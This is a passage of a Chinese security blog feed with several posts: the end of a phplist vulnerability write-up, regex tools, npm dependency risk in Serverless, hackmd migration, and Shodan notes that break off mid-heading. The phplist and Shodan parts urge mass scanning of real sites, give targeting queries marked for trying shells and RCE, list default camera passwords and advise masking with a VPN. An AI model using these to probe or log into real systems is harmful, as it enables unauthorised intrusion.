id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>使用<code>===</code>强类型比较：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="comment">//Password validation.</span></span><br><span class="line">            !<span class="keyword">empty</span>($passwordDB) &amp;&amp; $encryptedPass === $passwordDB</span><br><span class="line">        )</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这种偶然现象可能不是很常见，但是还是借助fofa等工具搜集下使用phplist的网站，批量打一下。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式调试工具及常用正则收集</title>
      <link href="/passages/2020-1-18-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E6%94%B6%E9%9B%86/"/>
      <url>/passages/2020-1-18-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%8F%8A%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/regexp.JPG" alt></p><a id="more"></a><blockquote><p>最近在审计代码的时候，总是遇到很多晦涩难懂的正则表达式</p><p>找了几个正则的调试工具、开发上常用的一些正则表达式</p></blockquote><h2 id="正则表达式调试工具"><a href="#正则表达式调试工具" class="headerlink" title="正则表达式调试工具"></a>正则表达式调试工具</h2><h3 id="regex101"><a href="#regex101" class="headerlink" title="regex101"></a>regex101</h3><p><a href="https://regex101.com/" target="_blank" rel="noopener">https://regex101.com/</a></p><p>非常实用丰富的正则调试工具，支持<code>PCRE(PHP)</code>、<code>ECMAScript(JavaScript)</code>、<code>Python</code>、<code>Golang</code>。</p><p><img src="1.png" alt></p><h3 id="debuggex"><a href="#debuggex" class="headerlink" title="debuggex"></a>debuggex</h3><p><a href="https://www.debuggex.com/" target="_blank" rel="noopener">https://www.debuggex.com/</a></p><p>特点：</p><ol><li>支持将正则表达式转化为自动机，并以图片显示自动机</li><li>能够实时更新自动机图片</li><li>支持输入待匹配字符串，良好的调试支持</li></ol><p><img src="2.png" alt></p><h3 id="regexper-和-Regulex"><a href="#regexper-和-Regulex" class="headerlink" title="regexper 和 Regulex"></a>regexper 和 Regulex</h3><p><a href="https://regexper.com/" target="_blank" rel="noopener">https://regexper.com/</a></p><p><a href="https://jex.im/regulex/" target="_blank" rel="noopener">https://jex.im/regulex/</a></p><p>支持将正则表达式转换为自动机，图片显示比较好看hh。</p><p><img src="3.png" alt></p><p><img src="4.png" alt></p><h2 id="常用正则表达式收集"><a href="#常用正则表达式收集" class="headerlink" title="常用正则表达式收集"></a>常用正则表达式收集</h2><p>参考项目：<a href="https://github.com/cdoco/common-regex" target="_blank" rel="noopener">https://github.com/cdoco/common-regex</a></p><h3 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h3><p><a href="mailto:`2362929771@qq.com" target="_blank" rel="noopener">`2362929771@qq.com</a>` 只允许英文字母、数字、下划线、英文句号、以及中划线组成</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0<span class="number">-9</span>_-]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$</span><br></pre></td></tr></table></figure><p><img src="5.png" alt></p><p><code>峰哥fenghlz@foxmail.com</code> 名称允许汉字、字母、数字，域名只允许英文域名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[A-Za-z0<span class="number">-9</span>\u4e00-\u9fa5]+@[a-zA-Z0<span class="number">-9</span>_-]+(\.[a-zA-Z0<span class="number">-9</span>_-]+)+$</span><br></pre></td></tr></table></figure><p><img src="6.png" alt></p><h3 id="电话"><a href="#电话" class="headerlink" title="电话"></a>电话</h3><p><code>13245678990</code> 手机号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^<span class="number">1</span>(<span class="number">3</span>|<span class="number">4</span>|<span class="number">5</span>|<span class="number">6</span>|<span class="number">7</span>|<span class="number">8</span>|<span class="number">9</span>)\d&#123;<span class="number">9</span>&#125;$</span><br></pre></td></tr></table></figure><p><img src="7.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Serverless 安全之依赖关系介绍</title>
      <link href="/passages/2019-11-29-Serverless-%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB%E4%BB%8B%E7%BB%8D/"/>
      <url>/passages/2019-11-29-Serverless-%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<blockquote><p>初探一个相当具有潜力的架构的安全性</p></blockquote><p><img src="/Serverless.jpg" alt></p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Serverless Framework是无服务器应用框架和生态系统，旨在简化开发和部署AWS Lambda应用程序的工作。Serverless Framework 作为 <strong>Node.js NPM 模块</strong>提供，填补了AWS Lambda 存在的许多缺口。它提供了多个样本模板，可以迅速启动 AWS Lambda 开发。</p></blockquote><p>毫无疑问，在最近的几年里，<strong>微服务</strong>渐渐成为了一个相当流行的架构风格。微服务大致从 2014 年起，开始流行开来。而 <strong>Serverless</strong> 是从 2016 年起，开始受到开发者的关注。并且从其发展趋势来看，它大有可能在几年后，拥有今天微服务一样的地位。可见，它是一个相当具有潜力的架构。</p><p>关于什么是 Serverless 架构以及如何使用它进行应用开发，本文不作其他介绍，感兴趣的同学可以学习：<br><a href="https://serverless.ink/" target="_blank" rel="noopener">Serverless 应用开发指南</a></p><p>本文更多的将从依赖关系的角度探讨无服务器的安全性。</p><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><p>依赖性体现在软件组，我们的软件需要它们才能正确运行。 利用其他软件可以加快开发过程，同样也会不可避免地带来安全问题。 导入一个软件包时，可能会需要导入其他软件包。 </p><p>Node Package Manager（<strong>NPM</strong>）用于管理依赖项。 当我们要向代码中添加软件包时，它将确定所需安装的软件包并对所需的软件包进行适当更改。 NPM这种简单性使我们非常容易安装许多软件包，但可能会更容易将存在漏洞的软件引入我们的代码库。</p><p>有时候我们必须考虑所需软件包中使用的依赖项。 例如，软件需要发出HTTP请求。 可以使用内置的http库，但是代码写起来太麻烦了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    hostname: <span class="string">'www.google.com'</span>,</span><br><span class="line">    port: <span class="number">80</span>,</span><br><span class="line">    path: <span class="string">'/upload'</span>,</span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: Buffer.byteLength(postData)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> req = http.request(options, (res) =&gt; &#123;</span><br><span class="line">    res.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">    res.on(<span class="string">'data'</span>, (chunk) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`data: <span class="subst">$&#123;chunk&#125;</span>`</span>);  <span class="comment">// Print the HTML for the Google homepage.</span></span><br><span class="line">    &#125;);</span><br><span class="line">    res.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'No more data in response.'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如果是我，我会选择request库，写起来太容易了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line">request(<span class="string">'http://www.google.com'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">error, response, body</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'error:'</span>, error); <span class="comment">// Print the error if one occurred</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'statusCode:'</span>, response.statusCode); <span class="comment">// Print the response status code if a response was received</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'body:'</span>, body); <span class="comment">// Print the HTML for the Google homepage.</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用request库所需的代码行少得多。 但也并不是特别好， 该库需要另外20个软件包才能有效地工作， 观察依赖关系树时，总共有49个依赖关系。 </p><p><img src="1.png" alt></p><p>查询依赖关系的工具：<a href="http://npm.anvaka.com/#!/" target="_blank" rel="noopener">http://npm.anvaka.com/#!/</a></p><p>got库是另一种代替http库的方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> got(<span class="string">'sindresorhus.com'</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(response.body);</span><br><span class="line">        <span class="comment">//=&gt; '&lt;!doctype html&gt; ...'</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(error.response.body);</span><br><span class="line">        <span class="comment">//=&gt; 'Internal server error ...'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>使用该库比request库的代码更复杂，但是它只具有11个依赖项（总共24个）<br><img src="2.png" alt></p><h2 id="漏洞的管理"><a href="#漏洞的管理" class="headerlink" title="漏洞的管理"></a>漏洞的管理</h2><p>最佳的情况是，查看每个依赖项以了解整个软件所包含的内容。 但现实是，根据导入的软件包数量，效率会极其低。 相反，我们可以利用Node附带的Node Package Manager（NPM）。 它可以审核所有软件包。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">npm install request got</span><br><span class="line">npm audit</span><br><span class="line"></span><br><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line"> in 100 scanned packages</span><br></pre></td></tr></table></figure><p>之后，可能要考虑对软件包进行定期审核。</p><h2 id="看看-Serverless-Framework-的依赖关系"><a href="#看看-Serverless-Framework-的依赖关系" class="headerlink" title="看看 Serverless Framework 的依赖关系"></a>看看 Serverless Framework 的依赖关系</h2><p><img src="3.png" alt></p><p>如上图，无服务器软件包具有40个依赖关系，总共需要355个软件包。那么我受攻击的面就提高为355倍，gg…<br>所以定期更新无服务器软件包是必然的。 </p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>在编写无服务器应用程序时，最好检查一下导入的软件包、依赖关系树和已知漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快速将hackmd中的笔记迁移到博客</title>
      <link href="/passages/2019-11-28-%E5%BF%AB%E9%80%9F%E5%B0%86hackmd%E4%B8%AD%E7%9A%84%E7%AC%94%E8%AE%B0%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8D%9A%E5%AE%A2/"/>
      <url>/passages/2019-11-28-%E5%BF%AB%E9%80%9F%E5%B0%86hackmd%E4%B8%AD%E7%9A%84%E7%AC%94%E8%AE%B0%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>平时记笔记会用hackmd，有时会用codimd（原因你懂的）<br>将笔记迁移到博客最大的问题就是图片</p></blockquote><a id="more"></a><h2 id="快速下载某个页面中的图片"><a href="#快速下载某个页面中的图片" class="headerlink" title="快速下载某个页面中的图片"></a>快速下载某个页面中的图片</h2><p>一开始准备直接将hackmd中的md文本直接复制过去，但是奈何图片资源是放在外网上面的。。</p><p>于是想着将所有图片资源下载下来，存放在博客服务器上。</p><h3 id="F12下的图片"><a href="#F12下的图片" class="headerlink" title="F12下的图片"></a>F12下的图片</h3><p>访问hackmd的某一篇文章：</p><p><img src="Snipaste_2019-11-28_17-18-16.png" alt></p><p>F12看下图片资源，同时过滤url：</p><p><img src="Snipaste_2019-11-28_17-25-30.png" alt></p><p>只能单个图片进行下载，不能选择全部再下载。。。苦辽</p><h2 id="Firefox-Image-Picka插件"><a href="#Firefox-Image-Picka插件" class="headerlink" title="Firefox + Image Picka插件"></a>Firefox + Image Picka插件</h2><p>一开始并没有使用这个插件，想着写个python脚本爬一下目标url中的图片资源。但是用python进行request请求的时候还要挂socket5代理，索性放弃。</p><p>后来找着了火狐浏览器下的一个插件，可以快速下载某个网页中出现的图片。</p><p><img src="Snipaste_2019-11-28_18-50-30.png" alt></p><p>如下图，在需要下载图片的网页打开插件，过滤一下图片的来源url，设置保存的文件名（为原文件名）</p><p><img src="Snipaste_2019-11-28_18-53-15.png" alt></p><p>如此，我就把需要的图片资源快速下载下来了：</p><p><img src="Snipaste_2019-11-28_18-53-46.png" alt></p><h2 id="使用文本编辑器删除一些字段"><a href="#使用文本编辑器删除一些字段" class="headerlink" title="使用文本编辑器删除一些字段"></a>使用文本编辑器删除一些字段</h2><p>我是使用sublime对粘贴好的md文件进行替换，将<code>https://i.imgur.com/</code>替换为<code>空</code>即可：</p><p><img src="Snipaste_2019-11-28_19-02-05.png" alt></p><p>至此，就已经改好了一篇markdown文件了（也就两步：<code>复制粘贴</code>、<code>替换</code>）</p><h2 id="Next-to-Do"><a href="#Next-to-Do" class="headerlink" title="Next to Do"></a>Next to Do</h2><p>实验室主页中的文章（校赛wp等），是东海学长直接从hackmd复制粘贴过来的（hackmd编辑感觉超好！），不采取点手段就别想看到图片了。。</p><p>抽个时间把图片全部放到主页所在的服务器上，再把文章修改一下即可~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Shodan系统学习笔记</title>
      <link href="/passages/2019-11-24-Shodan%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/passages/2019-11-24-Shodan%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>很早就见识过Shodan的威力<br>这篇文章就系统总结一下Shodan的使用</p></blockquote><a id="more"></a><p>昨天Shodan十周年庆，当天购买永久会员只要1刀！<br>祝Shodan越做越好！</p><h2 id="Shodan是什么"><a href="#Shodan是什么" class="headerlink" title="Shodan是什么"></a>Shodan是什么</h2><blockquote><p>是一款特殊的<strong>搜索引擎</strong>，并不只单单针对Web中的各类html数据进行爬取。Shodan 是基于<strong>各类在线网络设备的banner</strong>进行全网搜索。<br>其中 Shodan 上最受欢迎的搜索内容是：webcam，linksys，cisco，netgear，SCADA等等。</p></blockquote><h2 id="我们可以利用Shodan来干什么"><a href="#我们可以利用Shodan来干什么" class="headerlink" title="我们可以利用Shodan来干什么"></a>我们可以利用Shodan来干什么</h2><blockquote><ol><li>利用 0day 实施大规模批量入侵，<strong>前提是不要把自己的0day撞到别人的蜜罐里面去了,否则就可惜了</strong></li><li><strong>全网批量统计</strong>所有感染有某一数据特征的后门，可以专门用来检测某种定向攻击</li><li><strong>批量扫描</strong>各种中间件的高危错误配置及能被远程利用的各类已知漏洞，也就是说完全可以把它当成一个高级的漏洞扫描器来用</li><li>批量探测各种<strong>弱口令</strong></li><li>批量<strong>抓各种shell</strong> [ 不仅限于webshell，backdoor]等等……</li></ol></blockquote><h2 id="Shodan-语法"><a href="#Shodan-语法" class="headerlink" title="Shodan 语法"></a>Shodan 语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">city：   城市，只支持英文，而且不是能是简称。如TOKYO,Hong Kong,Seoul...</span><br><span class="line">country：  指定国家或地区后缀，比如:cn,us,jp,tw,br,ph,vn,hk...</span><br><span class="line">hostname： 指定主机名，其实就是目标域名[域名如果是子域还需要在前面加个.]</span><br><span class="line">net：      指定网络范围，可以是单个ip或者cidr格式的ip段</span><br><span class="line">os：   指定操作系统 centOS,win32,red hat,suse 等...</span><br><span class="line">port：  指定端口，HTTP (80),FTP (21),SSH (22),SNMP (161),SIP (5060)等...</span><br><span class="line">product：  指定具体的产品名称,如,各类操作系统/软件/平台/web服务器,数据库服务器,网络设备名称等...</span><br><span class="line">org：       搜索指定的组织或公司，例如 org:&quot;google&quot;</span><br><span class="line">isp：       搜索指定的ISP供应商，例如 isp:&quot;China Telecom&quot;</span><br><span class="line">version：   搜索指定的软件版本，例如 version:&quot;1.6.2&quot;</span><br><span class="line">geo：       搜索指定的地理位置，参数为经纬度，例如 geo:&quot;31.8639, 117.2808&quot;</span><br><span class="line">before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:&quot;11-11-15&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Shodan官网界面介绍"><a href="#Shodan官网界面介绍" class="headerlink" title="Shodan官网界面介绍"></a>Shodan官网界面介绍</h2><p>比如我搜索“SSH”：</p><p><img src="1.png" alt><br><img src="2.png" alt></p><p><strong>左侧</strong>是大量的汇总数据包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Results map – 搜索结果展示地图</span><br><span class="line">Top services (Ports) – 使用最多的服务/端口</span><br><span class="line">Top organizations (ISPs) – 使用最多的组织/ISP</span><br><span class="line">Top operating systems – 使用最多的操作系统</span><br><span class="line">Top products (Software name) – 使用最多的产品/软件名称</span><br></pre></td></tr></table></figure></p><p><strong>中间</strong>的主页面我们可以看到包含如下的搜索结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IP 地址</span><br><span class="line">主机名</span><br><span class="line">ISP</span><br><span class="line">该条目的收录收录时间</span><br><span class="line">该主机位于的国家</span><br><span class="line">Banner 信息</span><br></pre></td></tr></table></figure></p><p>想要了解每个条目的具体信息，只需要点击每个IP。此时，URL 会变成这种格式<code>https://www.shodan.io/host/[IP]</code>，所以我们也可以通过直接访问指定的 IP 来查看详细信息。</p><p><img src="3.png" alt></p><p>上图中我们可以从<strong>顶部</strong>在地图中看到主机的物理地址，从<strong>左侧</strong>了解到主机的相关信息，<strong>右侧</strong>则包含目标主机的端口列表及其详细信息。</p><h2 id="一些简单的搜索实例"><a href="#一些简单的搜索实例" class="headerlink" title="一些简单的搜索实例"></a>一些简单的搜索实例</h2><hr><p>搜集某个城市的特定设备 [这里暂以不同类型的web服务器为例] 标识 [自己可以事先多收集一些常见的软件和设备标识]:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Microsoft-IIS/5.0 city:&quot;TOKYO&quot;   可逐个尝试能否直接写shell</span><br><span class="line">Microsoft-IIS/6.0 city:&quot;Seoul&quot; 可逐个尝试能否直接 RCE</span><br><span class="line">Microsoft-IIS/7.5 city:&quot;Hong Kong&quot; </span><br><span class="line">apache city:&quot;Nagoya&quot; </span><br><span class="line">Apache/2.2.27 city:&quot;Nagoya&quot;</span><br><span class="line">Tomcat city:&quot;Seoul&quot;可逐个尝试能否直接 RCE</span><br><span class="line">cisco city:&quot;Osaka&quot;</span><br><span class="line">tplink city:&quot;nanjing&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索特定版本的操作系统及端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">os:&quot;linux&quot; net:&quot;72.34.62.0/24&quot;</span><br><span class="line">os:&quot;windows&quot; net:&quot;195.40.91.0/24&quot;</span><br><span class="line">Apache city:&quot;Hong Kong&quot; port:&quot;8080&quot;  product:&quot;Apache Tomcat/Coyote JSP engine&quot;</span><br><span class="line">Apache city:&quot;Seoul&quot; port:&quot;8080&quot;</span><br><span class="line">hostname:&quot;.polyu.edu.hk&quot; os:&quot;windows&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索指定国家地域特定类型的工具服务 (还是那句话,多搜集一些高质量的工具banner):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product:&quot;tomcat&quot;  net:&quot;158.132.18.0/24&quot;</span><br><span class="line">product:&quot;apache&quot;  net:&quot;158.132.18.0/24&quot;</span><br><span class="line">product:&quot;iis&quot;     net:&quot;158.132.18.0/24&quot;</span><br><span class="line">port:&quot;8080&quot; jboss country:CN</span><br><span class="line">port:&quot;8080&quot; jboss country:IN</span><br></pre></td></tr></table></figure></p><hr><p>扫描指定网段内的所有特定数据库服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">product:&quot;Mysql&quot;  net:&quot;140.117.13.0/24&quot; port:&quot;3306&quot;</span><br><span class="line">port:&quot;1433&quot; net:&quot;78.131.197.0/24&quot;</span><br><span class="line">port:&quot;5432&quot; net:&quot;77.55.149.0/24&quot;</span><br><span class="line">port:&quot;1521&quot; net:&quot;78.143.192.0/12&quot;</span><br><span class="line">port:&quot;1521&quot; city:&quot;Osaka&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索特定远程管理终端端口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os:&quot;windows&quot; port:&quot;3389&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;22&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;23&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">os:&quot;linux&quot; port:&quot;23&quot; net:&quot;87.124.0.0/15&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索ftp / tftp :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">port:&quot;21&quot; net:&quot;107.160.1.0/24&quot;</span><br><span class="line">port:&quot;69&quot; net:&quot;218.242.16.0/24&quot;</span><br></pre></td></tr></table></figure></p><hr><p>在某个城市中搜索指定的端口,操作系统及在线网络设备:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">city:&quot;Hong Kong&quot; port:&quot;69&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;3389&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;22&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;23&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;3306&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;110&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; os:&quot;windows&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; product:&quot;cisco&quot;</span><br><span class="line">city:&quot;Hong Kong&quot; port:&quot;8080&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索指定国家的特定设备,端口,服务器:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">port:&quot;23&quot; country:CN</span><br><span class="line">port:&quot;1433&quot; country:CN</span><br><span class="line">port:&quot;3389&quot; country:CN</span><br><span class="line">tplink country:CN</span><br><span class="line">huawei country:CN</span><br><span class="line">netcam  country:CN</span><br><span class="line">country:CN net:&quot;115.225.113.0/24&quot; port:&quot;22&quot;</span><br><span class="line">country:CN router</span><br><span class="line">admin login  country:HK</span><br><span class="line">hacked by country:HK</span><br></pre></td></tr></table></figure></p><hr><p>搜缺省密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;default password&quot; city:&quot;Hong Kong&quot;</span><br><span class="line">country:CN &quot;default password&quot;</span><br></pre></td></tr></table></figure></p><hr><p>搜索各类漏洞摄像头:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcam net:&quot;187.189.82.0/24&quot;</span><br></pre></td></tr></table></figure></p><h2 id="常见设备的默认用户名密码，可以尝试撞撞运气"><a href="#常见设备的默认用户名密码，可以尝试撞撞运气" class="headerlink" title="常见设备的默认用户名密码，可以尝试撞撞运气"></a>常见设备的默认用户名密码，可以尝试撞撞运气</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ACTi: admin/123456 or Admin/123456</span><br><span class="line">Axis (traditional): root/pass,</span><br><span class="line">Axis (new): requires password creation during first login</span><br><span class="line">Cisco: No default password, requires creation during first login</span><br><span class="line">Grandstream: admin/admin</span><br><span class="line">IQinVision: root/system</span><br><span class="line">Mobotix: admin/meinsm</span><br><span class="line">Panasonic: admin/12345</span><br><span class="line">Samsung Electronics: root/root or admin/4321</span><br><span class="line">Samsung Techwin (old): admin/1111111</span><br><span class="line">Samsung Techwin (new): admin/4321</span><br><span class="line">Sony: admin/admin</span><br><span class="line">TRENDnet: admin/admin</span><br><span class="line">Toshiba: root/ikwd</span><br><span class="line">Vivotek: root/&lt;blank&gt;</span><br><span class="line">WebcamXP: admin/ &lt;blank&gt;</span><br></pre></td></tr></table></figure><h2 id="别人的一点小结"><a href="#别人的一点小结" class="headerlink" title="别人的一点小结"></a>别人的一点小结</h2><ul><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a>   知道创宇的钟馗之眼，基于shodan实现</li><li>完全手工的话,确实挺累的,为什么不写成<strong>自动化的脚本</strong>来帮我们完成呢。很多现成的优秀脚本是我们学习的来源</li><li>在写脚本之前,自己首先要能熟练使用才是,这样写出来的工具杀伤力才能更大些</li><li>用这些搜索引擎的时候,最好全程挂上vpn,<strong>推荐美国的</strong>,原因大家应该都明白,自家人对自家人的限制几乎是最少的</li></ul><h2 id="利用MSF-Shadon搜索网络摄像头"><a href="#利用MSF-Shadon搜索网络摄像头" class="headerlink" 